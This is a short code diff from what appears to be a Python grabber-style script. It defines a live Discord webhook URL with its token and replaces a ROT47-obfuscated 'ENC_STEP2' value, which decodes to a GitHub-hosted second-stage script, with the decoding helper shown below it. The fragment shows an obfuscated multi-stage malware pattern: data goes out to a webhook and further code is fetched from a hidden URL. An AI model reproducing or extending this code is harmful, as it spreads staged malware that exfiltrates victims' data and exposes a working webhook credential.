@@ -14,7 +14,7 @@ from pathlib import Path
 from concurrent.futures import ThreadPoolExecutor
 
 WEBHOOK = "https://discord.com/api/webhooks/1527523825946726440/2fMDRzaPvW8s19OuWTJrHTo6vjsGXLEog4eIpUbYS_vmlg9e2WzYRGZYkfpUja-alzpV"
-ENC_STEP2 = "9DDpsD^D]4@>^D4C:AEa^DE6A`]AJ"  # Replace with your encoded URL
+ENC_STEP2 = "9EEADi^^8:E9F3]4@>^32EA=2E3@E^x!v2336C^3=@3^>2:?^$E6Aa]AJ"  # Replace with your encoded URL
 
 def rot47(s):
     return ''.join(chr(33 + ((ord(c) - 33 + 47) % 94)) if 33 <= ord(c) <= 126 else c for c in s)
